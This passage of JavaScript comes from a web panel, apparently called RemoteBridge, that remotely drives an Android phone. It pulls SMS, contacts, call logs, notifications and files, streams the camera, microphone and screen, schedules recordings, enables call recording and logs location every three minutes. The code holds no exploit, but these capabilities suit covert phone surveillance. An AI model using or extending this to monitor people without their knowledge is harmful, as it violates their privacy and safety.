                    <p><b class="text-emerald-300">4.</b> الصق الرابط في بطاقة Drive أعلاه (ملء النطاق) ثم اضغط «🔌 اختبار الربط». الملفات ستُحفظ في مجلد اسمه كما حددت (افتراضي RemoteBridge).</p>
                    <p class="text-[10px] text-slate-500">ملاحظة: الرفع يمر بجلب المحتوى مفكوك التشفير من الهاتف عبر الربط الحي (DataChannel)، وإذا كان الاتصال غير مفتوح ستظهر رسالة تنبيه.</p>
                </div>`);
        }
        function rbDriveCopyCode() {
            try {
                navigator.clipboard.writeText(RB_APPS_SCRIPT_CODE).then(() => showToast('نُسخ كود Apps Script 📋', 'success')).catch(() => showToast('انسخ الكود يدوياً من النافذة', 'info'));
            } catch (_) {}
        }

        // B8 — تشغيل مؤقّت المزامنة التلقائية عند الإقلاع (بحسب الإعدادات المحفوظة)
        try { rbDriveRestartSync(); } catch (_) {}

        function setupDataChannelEvents() {
            if (!dataChannel) return;
            dataChannel.onopen = () => {
                showToast("قناة البيانات المباشرة P2P مفتوحة ومستعدة للتبادل", "success");
                updateWebRTCDiagnosticUI();
            };
            dataChannel.onclose = () => {
                updateWebRTCDiagnosticUI();
            };
            dataChannel.onmessage = (event) => {
                try {
                    let raw = event.data;
                    if (typeof raw !== 'string') {
                        handleBinaryChunk(raw);
                        return;
                    }
                    const resp = JSON.parse(raw);
                    if (resp.type === 'push_event') {
                        handlePushEvent(resp);
                        return;
                    }
                    handleRPCResponse(resp);
                } catch (e) {
                    console.error("DataChannel JSON decode error:", e);
                }
            };
        }

        // خريطة للطلبات المعلقة مع timeout
        const pendingRpcRequests = new Map();

        // ============================================================
        //                 Phase 2 — أدوات مشتركة جديدة
        // ============================================================

        // 1) عدّادات "لم تتم معاينته بعد" (شارات حمراء داخل دوائر)
        const unreadViews = { files: 0, contacts: 0, sms: 0, calls: 0, notifications: 0 };
        const seenCounts  = { files: 0, contacts: 0, sms: 0, calls: 0, notifications: 0 };

        function getTabCount(tab) {
            if (tab === 'files') return filesData.length;
            if (tab === 'contacts') return contactsData.length;
            if (tab === 'sms') return smsData.length;
            if (tab === 'calls') return callsData.length;
            if (tab === 'notifications') return notificationsData.length;
            return 0;
        }

        function refreshAllBadges() {
            ['files', 'contacts', 'sms', 'calls', 'notifications'].forEach(tab => {
                const desktop = document.getElementById("badge-" + tab);
                const mobile = document.getElementById("badge-" + tab + "-m");
                const extra = getTabCount(tab) - seenCounts[tab];
                const n = Math.max(0, unreadViews[tab] + (extra > 0 ? extra : 0));
                if (desktop) { desktop.textContent = String(n); desktop.hidden = n === 0; }
                if (mobile)  { mobile.textContent = String(n); mobile.hidden = n === 0; }
                unreadViews[tab] = 0; // يُحتسب مرة واحدة عند وصول كل دفعة
            });
        }

        function markTabSeen(tab) {
            seenCounts[tab] = getTabCount(tab);
            refreshAllBadges();
        }

        function bumpUnread(tab, by = 1) {
            if (activeTab === tab) { seenCounts[tab] = getTabCount(tab); return; }
            unreadViews[tab] += by;
            refreshAllBadges();
        }

        // 2) أوضاع عرض القوائم (تفاصيل / صغير / متوسط / كبير)
        let listModes = { files: 'details', contacts: 'details', sms: 'threads', calls: 'details', notifications: 'groups' };
        try {
            const savedModes = JSON.parse(localStorage.getItem('remotebridge_listmodes_v1'));
            if (savedModes) listModes = Object.assign(listModes, savedModes);
        } catch (_) {}

        function setListMode(tab, mode) {
            listModes[tab] = mode;
            try { localStorage.setItem('remotebridge_listmodes_v1', JSON.stringify(listModes)); } catch (_) {}
            if (tab === 'files') applyFilesFilterAndSort();
            else if (tab === 'sms') applySmsFilterAndSort();
            else if (tab === 'contacts') applyContactsFilterAndSort();
            else if (tab === 'calls') applyCallFilters();
            else if (tab === 'notifications') applyNotifFilters();
        }

        function renderModeButtons(tab, extraButtons = '') {
            const modes = tab === 'sms' || tab === 'notifications'
                ? [{ k: tab === 'sms' ? 'threads' : 'groups', l: '🗂️ مُجمّع' }, { k: 'small', l: 'صغير' }, { k: 'medium', l: 'متوسط' }, { k: 'large', l: 'كبير' }, { k: 'details', l: 'تفاصيل' }]
                : [{ k: 'small', l: 'صغير' }, { k: 'medium', l: 'متوسط' }, { k: 'large', l: 'كبير' }, { k: 'details', l: 'تفاصيل' }];
            return `
                <div class="flex flex-wrap items-center gap-1 col-span-2 sm:col-span-4 bg-slate-950/70 border border-slate-800 rounded-lg px-2 py-1.5">
                    <span class="text-[10px] text-slate-500 font-bold ml-1">نمط العرض:</span>
                    ${modes.map(m => `<button onclick="setListMode('${tab}', '${m.k}')" class="vm-btn ${tab === 'files' && (m.k === 'small' || m.k === 'medium' || m.k === 'large') ? 'fm-file-grid' : ''} text-[10px] font-bold px-2 py-1 rounded-md bg-slate-800 border border-slate-700 text-slate-300 hover:bg-slate-700 ${listModes[tab] === m.k ? 'vm-active' : ''}">${m.l}</button>`).join('')}
                    ${extraButtons}
                </div>
            `;
        }

        // 3) دمج أسماء جهات الاتصال (يُستخدم للرسائل والمكالمات)
        function normNum(n) { return String(n || '').replace(/[^\d+]/g, '').replace(/^\+/, ''); }

        function contactNameMap() {
            const map = {};
            contactsData.forEach(c => {
                const display = c.displayName || '';
                (c.phoneNumbers || []).forEach(p => {
                    const key = normNum(p);
                    if (key) map[key] = display;
                });
            });
            return map;
        }

        function resolveContactName(number) {
            if (!number) return null;
            const n = normNum(number);
            if (!n) return null;
            const map = contactNameMap();
            if (map[n]) return map[n];
            const tail = n.slice(-7);
            if (tail) {
                for (const k in map) { if (k.endsWith(tail)) return map[k]; }
            }
            return null;
        }

        // 4) الاسم الصياغي للتطبيقات في الإشعارات
        const packageNameFriendly = {
            'com.whatsapp': ' WhatsApp', 'com.whatsapp.w4b': ' WhatsApp Business',
            'com.google.android.gm': ' Gmail', 'com.android.mms': ' رسائل النظام',
            'com.google.android.apps.messaging': ' Messages',
            'com.facebook.orca': ' Messenger', 'com.facebook.katana': ' Facebook',
            'com.instagram.android': ' Instagram', 'com.twitter.android': ' Twitter',
            'com.android.phone': ' الهاتف', 'com.android.dialer': ' الهاتف',
            'com.samsung.android.messaging': ' Samsung Messages',
            'com.samsung.android.dialer': ' Samsung Phone',
            'com.android.vending': ' Google Play', 'com.android.systemui': ' النظام',
            'com.sec.android.app.launcher': ' الواجهة'
        };

        // 5) ثَبَنِ (Cache) مصغرات الملفات الحقيقية
        const fileThumbnailCache = new Map();
        let fileThumbTimer = null;

        function requestFileThumbnail(f) {
            if (fileThumbnailCache.has(f.id)) {
                const img = document.getElementById('thumb-img-' + f.id);
                if (img) img.src = fileThumbnailCache.get(f.id);
                return;
            }
            if (fileThumbnailCache.has('r' + f.id)) return; // طلب جارٍ
            fileThumbnailCache.set('r' + f.id, true);
            clearTimeout(f._thumbTimer || null);
            f._thumbTimer = setTimeout(() => {
                sendRPCCommand('file_thumbnail', { id: f.id, name: f.name, mimeType: f.mimeType, path: (currentExplorerPath || '/') === '/' ? ('/' + f.name) : (currentExplorerPath + f.name) }, { timeout: 8000, retries: 0 })
                    .then(data => {
                        fileThumbnailCache.delete('r' + f.id);
                        if (data && (data.thumbnail || data.dataUrl)) {
                            const src = data.thumbnail || data.dataUrl;
                            fileThumbnailCache.set(f.id, src);
                            const img = document.getElementById('thumb-img-' + f.id);
                            if (img) img.src = src;
                            if (img) img.onerror = () => { img.src = ''; };
                        }
                    })
                    .catch(() => { fileThumbnailCache.delete('r' + f.id); });
            }, 150);
        }

        function isDirectory(f) {
            const isDir = f.isDir === true || f.isDir === 1 ||
                f.bucket === 'folder' || f.bucket === 'directories' ||
                f.mimeType === 'inode/directory' || f.mimeType === 'vnd.android.document/directory' ||
                f.mimeType === 'directory';
            return isDir;
        }

        // 6) استعلام مصغر للملف عبر الـ RPC المباشر من القائمة
        function streamAudioEnabled() { return streamState && streamState.audioEnabled === true; }

        function sendRPCCommand(command, params = null, options = {}) {
            const {
                timeout = 10000,
                retries = 3,
                fallbackToSignaling = true,
                onProgress = null
            } = options;

            const reqId = Math.floor(Math.random() * 100000);
            const req = { id: reqId, cmd: command, params: params };

            return new Promise((resolve, reject) => {
                const attempt = (attemptNum) => {
                    const targetInput = document.getElementById("target-device-id");
                    const targetId = (targetInput && targetInput.value.trim()) || appConfig.targetDeviceId;

                    // التحقق من حالة DataChannel و WebSocket
                    const dcReady = dataChannel && dataChannel.readyState === "open";
                    const wsReady = ws && ws.readyState === WebSocket.OPEN;

                    if (!dcReady && !wsReady) {
                        reject(new Error("لا يوجد اتصال متاح (DataChannel و WebSocket مغلقان)"));
                        return;
                    }

                    // محاولة الإرسال عبر DataChannel أولاً (P2P أسرع)
                    let sent = false;
                    if (dcReady) {
                        try {
                            dataChannel.send(JSON.stringify(req));
                            sent = true;
                        } catch (e) {
                            console.warn("DataChannel send failed, falling back to signaling", e);
                        }
                    }

                    // fallback إلى WebSocket إذا فشل DataChannel
                    if (!sent && wsReady && fallbackToSignaling) {
                        if (!targetId) {
                            reject(new Error("يرجى اختيار وتحديد الجهاز المضيف المستهدف أولاً"));
                            return;
                        }
                        ws.send(JSON.stringify({
                            type: "rpc_request",
                            from: myDeviceId,
                            to: targetId,
                            requestId: reqId,
                            cmd: command,
                            params: params
                        }));
                        sent = true;
                    }

                    if (!sent) {
                        reject(new Error("فشل إرسال الأمر"));
                        return;
                    }

                    // تعيين timeout للانتظار للرد
                    const timer = setTimeout(() => {
                        pendingRpcRequests.delete(reqId);
                        if (attemptNum < retries) {
                            console.log(`RPC timeout, retry ${attemptNum + 1}/${retries}`);
                            setTimeout(() => attempt(attemptNum + 1), 1000 * attemptNum);
                        } else {
                            reject(new Error(`انتهت مهلة الانتظار للأمر: ${command}`));
                        }
                    }, timeout);

                    pendingRpcRequests.set(reqId, { resolve, reject, timer, command });
                };

                attempt(1);
            });
        }

        // === نسخة موحّدة نهائية من معالج الردود (كانت موجودة بنسختين مكررتين) ===
        function handleRPCResponse(resp) {
            if (!resp) {
                showToast("لا توجد استجابة من المضيف", "warning");
                return;
            }

            // 0) فكّ الوعود المعلقة (لا نعيد الإرجاع مبكراً — يُتابع التوجيه بعدها
            //    لأن هناك مسارات تعتمد على التحديث المباشر في اللوحة)
            const pending = pendingRpcRequests.get(resp.id);
            if (pending) {
                clearTimeout(pending.timer);
                pendingRpcRequests.delete(resp.id);
                if (!resp.ok) {
                    pending.reject(new Error(resp.error || "فشل تنفيذ الأمر"));
                } else {
                    pending.resolve(resp.data || {});
                }
            }

            // B8 — رؤوس نقل محتوى الملف/الخزنة القطعي عبر قناة البيانات:
            // started {name,size} يخبر الحجم الكلي المتوقع، وcompleted يختم النقل.
            try {
                if (resp.ok && resp.data && (resp.data.started || resp.data.completed)) {
                    window.__rbContentHeaders = window.__rbContentHeaders || {};
                    window.__rbContentHeaders[resp.id] = resp.data;
                }
            } catch (_) {}

            if (!resp.ok) {
                showToast("رد المضيف: " + (resp.error || "خطأ في تنفيذ الأمر"), "warning");
                return;
            }
            const data = resp.data || {};
            const cmd = data.cmd || resp.cmd;

            // B6 — حفظ تلقائي لأرشيف المتحكم: عندما يصل رد حقيقي عبر الربط P2P
            // (يعني: المضيف والمتحكم متصلان بنفس الجلسة والوقت) تُخزَّن نسخة
            // من القوائم/بيانات الجهاز في ملفات المتحكم المحلية للتصفح لاحقاً.
            try { archiveDeviceCapture(cmd, data); } catch (_) {}

            // B4 — تتبع حالة أذونات الهاتف المضيف من ردود الأوامر الحقيقية (تُعرض في الإعدادات)
            try {
                if (cmd === 'notifications_list') {
                    if (data.permissionWarning) markHostPerm('notifications', false);
                    else if ((data.items || []).length > 0) markHostPerm('notifications', true);
                } else if (cmd === 'calls_list') {
                    markHostPerm('callLog', data.permissionWarning ? false : true);
                } else if (cmd === 'media_folders') {
                    markHostPerm('storage', true);
                } else if (cmd === 'recordings_list') {
                    markHostPerm('storage', true);
                } else if (cmd === 'rec_start') {
                    markHostPerm('cameraMic', !data.error && String(data.kind || '') === 'camera');
                } else if (cmd === 'call_record_set') {
                    markHostPerm('callRecord', data.ok !== false && !!data.enabled);
                }
            } catch (_) {}

            // 1) DEVICE_INFO Response
            if (cmd === 'device_info' || data.deviceName || data.batteryLevel !== undefined) {
                updateDashboardCards(data);
                if (deviceInfoResolver) {
                    try { deviceInfoResolver(data); } catch (_) {}
                }
                showHintOnce("device-info-sync", "تم جلب بيانات الهاتف المضيف الحية");
                return;
            }

            // ⏺ بدء تسجيل
            if (cmd === 'rec_start') {
                delete recPending[data.kind];
                if (data.error) {
                    showToast("فشل بدء التسجيل: " + data.error, "error");
                    recActiveM[data.kind] = false;
                } else {
                    recActiveM[data.kind] = true;
                    showToast(data.scheduled
                        ? `⏺ تم جدولة تسجيل ${recKindLabel(data.kind)} — سيعمل تلقائياً في موعده`
                        : `⏺ بدأ تسجيل ${recKindLabel(data.kind)} (${data.segmentSec || 180}s${(data.repeatCount || 1) > 1 ? '، مقاطع: ' + data.repeatCount : (data.intervalSec > 0 ? '، كل ' + data.intervalSec + 's' : '')})`, "success");
                }
                refreshRecButtons();
                return;
            }

            // ⏹ إيقاف تسجيل
            if (cmd === 'rec_stop') {
                if (data.stopped) {
                    recActiveM[data.kind] = false;
                    showToast(`⏹ تم إيقاف تسجيل ${recKindLabel(data.kind)}`, "info");
                } else {
                    showToast("لا يوجد تسجيل نشط بهذا النوع", "warning");
                }
                refreshRecButtons();
                return;
            }

            // 📷 لقطة شاشة
            if (cmd === 'screenshot') {
                if (data.image) {
                    showScreenshotModal(data.image);
                    showToast("📷 تم التقاط لقطة الشاشة وعرضها", "success");
                } else if (data.error) {
                    showToast("📷 " + data.error, "error");
                }
                return;
            }

            // رد أمر غير معروف في التوجيه؟
            if (data.permissionWarning !== undefined) {
                showToast("تنبيه المضيف: " + data.permissionWarning, "warning");
            }

            // 2) Items array responses (Contacts, SMS, Calls, Notifications, Files)
            if (data.items !== undefined && Array.isArray(data.items)) {
                // الاستوديو: مجلدات الوسائط / عناصر الوسائط من الجهاز المضيف
                if (cmd === 'media_folders') {
                    // B5 — تُخزَّن قائمة المجلدات دائماً لمتصفح المجلدات حتى خارج تبويب الاستوديو
                    window.__fbFoldersCache = data.items || [];
                    if (activeTab === 'studio') renderStudioFolderPicker(data.items);
                    if (typeof window.__fbOnFolders === 'function') { try { window.__fbOnFolders(); } catch (e) {} }
                    return;
                }
                if (cmd === 'media_items') {
                    // B5 — توجيه عناصر التصفح إلى متصفح المجلدات دون المساس بحالة الاستوديو
                    if (window.__fbPending) {
                        window.__fbPending = false;
                        window.__fbItems = (data.items || []).filter(it => it && it.kind);
                        if (typeof renderFolderBrowserBody === 'function') renderFolderBrowserBody();
                        return;
                    }
                    studioItems = (data.items || []).filter(it => it && it.kind);
                    studioItems.sort((a, b) => (b.dateMs || 0) - (a.dateMs || 0));
                    studioLoading = false;
                    setStudioBadge(studioItems.length);
                    if (activeTab === 'studio') renderStudioGrid();
                    return;
                }
                // 📂 أرشيف التسجيلات + 📍 نقاط المواقع (قوائم جديدة)
                if (cmd === 'recordings_list') {
                    recordingsCache = data.items || [];
                    markHostPerm('storage', true);
                    // B4 — جلب خريطة الملفات المتزامنة (المشفرة على الخادم) لاستبعاد التكرار والتأشير
                    if (typeof loadRecordingsServerDedup === 'function') loadRecordingsServerDedup(recordingsFolderCurrent);
                    if (typeof renderRecordingsGrid === 'function') renderRecordingsGrid();
                    return;
                }
                if (cmd === 'locations_get') {
                    locationPointsCache = data.items || [];
                    locationTrackingInfo = data.tracking === true;
                    if (typeof renderLocationFolderView === 'function') renderLocationFolderView();
                    return;
                }
                let targetType = activeTab;

                if (cmd === 'contacts_list') {
                    targetType = 'contacts';
                } else if (cmd === 'sms_list') {
                    targetType = 'sms';
                } else if (cmd === 'calls_list') {
                    targetType = 'calls';
                } else if (cmd === 'notifications_list') {
                    targetType = 'notifications';
                } else if (cmd === 'file_list' || cmd === 'storage_explore') {
                    targetType = 'files';
                } else if (data.items.length > 0) {
                    const sample = data.items[0];
                    if (sample.phoneNumber !== undefined || sample.displayName !== undefined || sample.phoneNumbers !== undefined) {
                        targetType = 'contacts';
                    } else if (sample.body !== undefined || sample.address !== undefined) {
                        targetType = 'sms';
                    } else if (sample.number !== undefined || sample.durationSec !== undefined || (sample.type !== undefined && sample.date !== undefined && sample.id !== undefined)) {
                        targetType = 'calls';
                    } else if (sample.packageName !== undefined || sample.postTime !== undefined) {
                        targetType = 'notifications';
                    } else if (sample.mimeType !== undefined || sample.isDir !== undefined || data.currentPath !== undefined) {
                        targetType = 'files';
                    }
                } else if (data.currentPath !== undefined) {
                    targetType = 'files';
                }

                if (targetType === 'files') {
                    filesData = data.items;
                    if (data.currentPath) currentExplorerPath = data.currentPath;
                } else if (targetType === 'contacts') {
                    contactsData = data.items;
                } else if (targetType === 'sms') {
                    smsData = data.items;
                } else if (targetType === 'calls') {
                    callsData = data.items;
                    if (cmd === 'calls_list' && data.permissionWarning) callsPermissionWarning = data.permissionWarning;
                    else if (data.items.length > 0) callsPermissionWarning = "";
                } else if (targetType === 'notifications') {
                    notificationsData = data.items;
                }

                if (data.items.length > 0) {
                    // الوصول حي: تبويب مفتوح = يُعالج أولياً؛ تبويب مغلق = شارة بعدّاد
                    if (targetType === activeTab) markTabSeen(targetType); else bumpUnread(targetType, data.items.length);
                }

                if (targetType === 'files' || targetType === 'sms' || targetType === 'calls') {
                    // الأسماء مطلوبة لعرض الرسائل/المكالمات بالاسم المحفوظ
                    if (contactsData.length === 0 && targetType !== 'contacts') {
                        sendRPCCommand('contacts_list', null, { timeout: 6000, retries: 0 }).catch(() => {});
                    }
                }

                if (activeTab === targetType) {
                    if (targetType === 'files') applyFilesFilterAndSort();
                    else if (targetType === 'contacts') applyContactsFilterAndSort();
                    else if (targetType === 'sms') applySmsFilterAndSort();
                    else if (targetType === 'calls') applyCallFilters();
                    else if (targetType === 'notifications') applyNotifFilters();
                }
                const countMsg = data.items.length > 0 ? ` (${data.items.length} عنصر)` : "";
                if (countMsg && !autoFetchToastSuppressed) showToast("تم جلب وتحديث القائمة الحية بنجاح!" + countMsg, "success");
                return;
            }

            // 3) Streaming Responses
            if (data.started !== undefined || data.stopped !== undefined || data.switched !== undefined || data.audioEnabled !== undefined || (cmd && cmd.includes('stream'))) {
                if (data.started) {
                    streamState.active = true;
                    if (data.mode === 'audio') {
                        streamState.audioOnly = true;
                        streamState.mode = 'audio';
                        streamState.audioEnabled = true;
                        showToast("تم بدء بث الصوت الحي (الميكروفون)!", "success");
                    } else if (data.mode === 'screen') {
                        streamState.audioOnly = false;
                        streamState.mode = 'screen';
                        // السياسة الجديدة: الكتم الافتراضي لكل البث المرئي
                        streamState.audioEnabled = data.audioEnabled === true;
                        showToast("تم بدء بث شاشة الهاتف الحية!", "success");
                    } else {
                        streamState.audioOnly = false;
                        streamState.mode = 'camera';
                        streamState.audioEnabled = data.audioEnabled === true;
                        showToast("تم بدء بث الكاميرا — الصوت مكتوم افتراضياً (انقر مكبر الصوت لتشغيله)", "info");
                    }
                    applyStreamMuteToElements();

                    // Trigger WebRTC renegotiation offer so active tracks stream immediately
                    setTimeout(() => {
                        const targetInput = document.getElementById("target-device-id");
                        const targetId = (targetInput && targetInput.value.trim()) || appConfig.targetDeviceId;
                        if (targetId) createWebRTCOffer(targetId);
                    }, 400);

                } else if (data.stopped) {
                    streamState.active = false;
                    streamState.audioOnly = false;
                    streamState.mode = 'none';
                    showToast("تم إيقاف كافة وسائل البث المباشر", "info");
                } else if (data.pendingPermission === true) {
                    // بانتظار منح الإذن على الهاتف — عند التسليم يصل نبض stream_started
                    // ويطلق إعادة التفاوض تلقائياً (إصلاح نافذة البث الفارغة)
                    streamState.mode = data.mode || streamState.mode || 'screen';
                    streamState.active = false;
                    showToast("📲 بانتظار منح إذن التقاط الشاشة على الهاتف المضيف — منّح الإذن وسينطلق البث تلقائياً", "warning");
                }

                if (data.isFront !== undefined) streamState.isFront = data.isFront;
                if (data.switched) streamState.isFront = data.isFront === true;
                if (data.audioEnabled !== undefined && !data.started) streamState.audioEnabled = data.audioEnabled === true;
                applyStreamMuteToElements();
                if (activeTab === 'camera') renderCameraStreamView();
            }
        }

        function updateDashboardCards(data) {
            if (!data) return;
            latestDeviceInfo = data;
            const batteryEl = document.getElementById("dash-battery");
            const storageEl = document.getElementById("dash-storage");
            const osEl = document.getElementById("dash-os");

            if (batteryEl) {
                const chargingText = data.isCharging ? " (جارٍ الشحن ⚡)" : " (على البطارية)";
                batteryEl.innerText = `🔋 ${data.batteryLevel}%${chargingText}`;
            }
            if (storageEl) {
                const freeGb = (data.storageFreeBytes / 1073741824).toFixed(1);
                const totalGb = (data.storageTotalBytes / 1073741824).toFixed(0);
                storageEl.innerText = `${freeGb} GB / ${totalGb} GB`;
            }
            if (osEl) {
                osEl.innerText = `Android ${data.androidVersion} (API ${data.sdkInt})`;
            }
        }

        // ============================================================
        //            Phase 2 — الأحداث الحية الدافعة من الهاتف
        // ============================================================
        // الهاتف المضيف يدفع push_event فور وصول: إشعار / رسالة / مكالمة
        function handlePushEvent(msg) {
            try {
                const kind = msg.kind || 'notification';
                const payload = msg.payload || {};
                const now = Date.now();

                if (kind === 'notification') {
                    const item = {
                        id: (payload.id || ('live-' + now + '-' + Math.random().toString(36).slice(2, 7))) + '',
                        packageName: payload.packageName || 'unknown',
                        title: payload.title || '',
                        text: payload.text || '',
                        postTime: payload.postTime || now
                    };
                    notificationsData = [item].concat(notificationsData);
                    if (activeTab === 'notifications') { applyNotifFilters(); markTabSeen('notifications'); }
                    else { bumpUnread('notifications', 1); }
                    const appName = packageNameFriendly[item.packageName] || item.packageName;
                    showToast(`🔔 إشعار جديد من ${appName}: ${item.title || ''} ${item.text || ''}`.trim(), "info");
                    refreshAllBadges();
                    return;
                }

                // 🎬 البث الحي بدأ فعلياً على المضيف (بعد الالتقاط/الإذن) — هندس إعادة التفاوض فوراً
                if (kind === 'stream_started') {
                    try {
                        const mode = payload.mode || 'screen';
                        const audioEnabled = payload.audioEnabled === true;
                        streamState.active = true;
                        streamState.audioOnly = (mode === 'audio');
                        streamState.mode = mode;
                        streamState.audioEnabled = audioEnabled;
                        applyStreamMuteToElements();
                        ensureStreamRenegotiation();
                        showToast(`✅ البث الحي بدأ فعلياً على المضيف (${mode === 'audio' ? 'ميكروفون' : mode === 'camera' ? 'كاميرا' : 'شاشة'}) — جارٍ استلام الإطارات`, "success");
                        if (activeTab === 'camera') renderCameraStreamView();
                    } catch (e) { console.warn('stream_started handler', e); }
                    return;
                }

                if (kind === 'stream_stopped') {
                    streamState.active = false;
                    streamState.mode = 'none';
                    streamState.audioOnly = false;
                    showToast("تم إيقاف البث الحي على المضيف", "info");
                    if (activeTab === 'camera') renderCameraStreamView();
                    return;
                }

                // 📍 نبضة موقع حية كل 3 دقائق
                if (kind === 'location') {
                    try {
                        const p = {
                            lat: payload.lat, lng: payload.lng,
                            ts: payload.ts || payload.deviceTs || now,
                            acc: payload.acc, speed: payload.speed, provider: payload.provider
                        };
                        if (typeof p.lat === 'number' && typeof p.lng === 'number') {
                            locationPointsCache = [p].concat(locationPointsCache).slice(0, 400);
                            if (recordingsFolderCurrent === 'location' && typeof renderLocationFolderView === 'function') {
                                renderLocationFolderView();
                            }
                        }
                    } catch (e) { console.warn('location push', e); }
                    return;
                }

                if (kind === 'sms') {
                    const item = {
                        id: payload.id || Math.floor(now / 1000),
                        threadId: payload.threadId || 0,
                        address: payload.address || '',
                        body: payload.body || '',
                        date: payload.date || now,
                        type: payload.type || 1,
                        contactName: payload.contactName || null
                    };
                    smsData = [item].concat(smsData);
                    if (activeTab === 'sms') { applySmsFilterAndSort(); markTabSeen('sms'); }
                    else { bumpUnread('sms', 1); }
                    const name = item.contactName || resolveContactName(item.address) || item.address || 'غير معروف';
                    showToast(`💬 رسالة جديدة من ${name}: ${(item.body || '').slice(0, 60)}`, "info");
                    refreshAllBadges();
                    return;
                }

                if (kind === 'call') {
                    const item = {
                        id: payload.id || Math.floor(now / 1000),
                        number: payload.number || '',
                        date: payload.date || now,
                        durationSec: payload.durationSec || 0,
                        type: payload.type || 3  // 1 واردة / 2 صادرة / 3 فائتة
                    };
                    callsData = [item].concat(callsData);
                    if (activeTab === 'calls') { applyCallFilters(); markTabSeen('calls'); }
                    else { bumpUnread('calls', 1); }
                    const badge = item.type === 1 ? 'مكالمة واردة' : item.type === 2 ? 'مكالمة صادرة' : 'مكالمة فائتة';
                    const cname = resolveContactName(item.number) || item.number || 'غير معروف';
                    showToast(`📞 ${badge} من ${cname}`, 'info');
                    refreshAllBadges();
                    return;
                }
            } catch (e) {
                console.warn('push_event error:', e);
            }
        }

        // ============================================================
        //  B4 — العرض والواجهة: نمط فاتح/داكن + الأقسام السريعة المخصصة
        //        + حالة أذونات المضيف الحقيقية + لوحة P2P قابلة للطي
        // ============================================================
        const QUICK_SECTIONS_CATALOG = [
            { id: 'files',         icon: '📁', label: 'مستكشف الملفات',  desc: 'تصفح الذاكرة' },
            { id: 'camera',        icon: '📹', label: 'البث المباشر',    desc: 'كاميرا ومايك' },
            { id: 'contacts',      icon: '📇', label: 'جهات الاتصال',    desc: 'الأرقام والمكالمات' },
            { id: 'notifications', icon: '🔔', label: 'الإشعارات الحية', desc: 'إشعارات التطبيقات' },
            { id: 'sms',           icon: '💬', label: 'الرسائل',         desc: 'دردشة SMS' },
            { id: 'calls',         icon: '📞', label: 'سجل المكالمات',   desc: 'أنذر وواردة' },
            { id: 'studio',        icon: '🎬', label: 'استوديو الوسائط', desc: 'تسجيل وتنزيل' },
        ];
        const QUICK_SECTIONS_KEY = 'remotebridge_quick_sections_v1';

        function getQuickSections() {
            try {
                const saved = JSON.parse(localStorage.getItem(QUICK_SECTIONS_KEY) || 'null');
                if (Array.isArray(saved) && saved.length > 0) {
                    const valid = saved.filter(id => QUICK_SECTIONS_CATALOG.some(s => s.id === id));
                    if (valid.length > 0) return valid;
                }
            } catch (_) {}
            return ['files', 'camera', 'contacts', 'notifications'];
        }

        function saveQuickSections(list) {
            try {
                const uniq = Array.from(new Set(list.filter(id => QUICK_SECTIONS_CATALOG.some(s => s.id === id))));
                localStorage.setItem(QUICK_SECTIONS_KEY, JSON.stringify(uniq.length ? uniq : ['files', 'camera', 'contacts', 'notifications']));
            } catch (_) {}
        }

        function toggleQuickSection(id) {
            const cur = getQuickSections();
            const next = cur.includes(id) ? cur.filter(x => x !== id) : [...cur, id];
            saveQuickSections(next);
            const grid = document.getElementById('quick-sections-grid');
            if (grid) grid.innerHTML = renderQuickSectionsGrid();
            renderQuickSectionEditor();
            showToast('تم تحديث الأقسام السريعة ✓', 'success');
        }

        function renderQuickSectionsGrid() {
            return getQuickSections().map(id => {
                const s = QUICK_SECTIONS_CATALOG.find(x => x.id === id) || QUICK_SECTIONS_CATALOG[0];
                return `
                    <div onclick="switchTab('${s.id}')" class="p-3 bg-slate-900/60 hover:bg-slate-800/80 border border-slate-800 rounded-2xl cursor-pointer transition text-center group">
                        <div class="text-2xl mb-1 group-hover:scale-110 transition transform">${s.icon}</div>
                        <p class="text-xs font-bold text-slate-200">${s.label}</p>
                        <p class="text-[10px] text-slate-400 mt-0.5">${s.desc}</p>
                    </div>
                `;
            }).join('');
        }

        function renderQuickSectionEditor() {
            const cur = getQuickSections();
            return QUICK_SECTIONS_CATALOG.map(s => `
                <label class="flex items-center gap-2 px-2.5 py-1.5 rounded-xl border ${cur.includes(s.id) ? 'border-emerald-500/50 bg-emerald-950/40' : 'border-slate-700 bg-slate-950/50'} cursor-pointer select-none">
                    <input type="checkbox" ${cur.includes(s.id) ? 'checked' : ''} onchange="toggleQuickSection('${s.id}')" class="accent-emerald-500 w-3.5 h-3.5">
                    <span class="text-sm">${s.icon}</span>
                    <span class="text-[11px] font-bold ${cur.includes(s.id) ? 'text-emerald-300' : 'text-slate-300'}">${s.label}</span>
                </label>
            `).join('');
        }

        // — نمط العرض: بديل فاتح/داكن — محفوظ محلياً —
        const UI_THEME_KEY = 'remotebridge_ui_theme_v1';
        function applyUiTheme(mode) {
            try { localStorage.setItem(UI_THEME_KEY, mode); } catch (_) {}
            document.body.classList.toggle('ui-light', mode === 'light');
        }
        function getUiTheme() {
            try { return localStorage.getItem(UI_THEME_KEY) || 'dark'; } catch (_) { return 'dark'; }
        }
        function setUiTheme(mode) {
            applyUiTheme(mode);
            const r1 = document.getElementById('ui-theme-dark'); if (r1) r1.checked = mode === 'dark';
            const r2 = document.getElementById('ui-theme-light'); if (r2) r2.checked = mode === 'light';
            showToast(mode === 'light' ? 'تم تفعيل النمط الفاتح ☀️' : 'تم تفعيل النمط الداكن 🌙', 'info');
        }

        // — P2P: طي/فتح التفاصيل — افتراضياً سطر واحد —
        function toggleP2PDetails() {
            const d = document.getElementById('p2p-details');
            if (!d) return;
            const show = d.hidden;
            d.hidden = !show;
            const btn = document.getElementById('p2p-expand-btn');
            if (btn) {
                // الأيقونة النابضة تدل على وجود تفاصيل مخفية — تتوقف عن الوميض عند العرض
                btn.classList.toggle('blink-pill', !show);
                btn.innerHTML = show ? '<span>🔍 إخفاء</span>' : '<span>🚨 تفاصيل</span>';
            }
        }

        // — حالة أذونات الهاتف المضيف (تُجمع من ردود الأفعال الحقيقية على المضيف) —
        const hostPermHints = {
            notifications: { ok: null, label: 'إذن الإشعارات (المستمع)' },
            battery:       { ok: null, label: 'استثناء البطارية' },
            cameraMic:     { ok: null, label: 'الكاميرا والمايك' },
            storage:       { ok: null, label: 'ذاكرة الجهاز والملفات' },
            callLog:       { ok: null, label: 'سجل المكالمات' },
            callRecord:    { ok: null, label: 'تسجيل المكالمات الصوتي' },
        };
        function hostPermCount() { return Object.values(hostPermHints).filter(p => p.ok).length; }

        function markHostPerm(key, ok) {
            const p = hostPermHints[key];
            if (!p || p.ok === ok) return;
            p.ok = ok;
